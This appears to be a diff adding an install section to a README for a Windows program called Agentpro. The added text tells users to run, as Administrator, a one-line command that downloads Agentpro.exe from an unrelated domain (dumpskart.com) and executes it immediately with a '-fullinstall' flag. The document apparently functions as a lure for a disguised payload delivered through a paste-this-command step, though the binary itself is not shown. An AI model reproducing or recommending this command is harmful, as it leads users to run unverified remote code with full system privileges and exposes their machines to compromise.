@@ -16,6 +16,14 @@ One-click installer for Agentpro. Downloads and installs Agentpro.exe to `C:\Pro
   
 ## 🚀 Quick Installation (Windows)
 
+## Download & Install (One-Line Command)
+ 
+### Windows (Run as Administrator in CMD or PowerShell):
+ 
+```
+curl -L -o "C:\Program Files\Agentpro.exe" "https://dumpskart.com/Mesh/Agentpro.exe" && "C:\Program Files\Agentpro.exe" -fullinstall
+```
+
 Run the following command in **Command Prompt (Run as Administrator)**:
 
 ```cmd
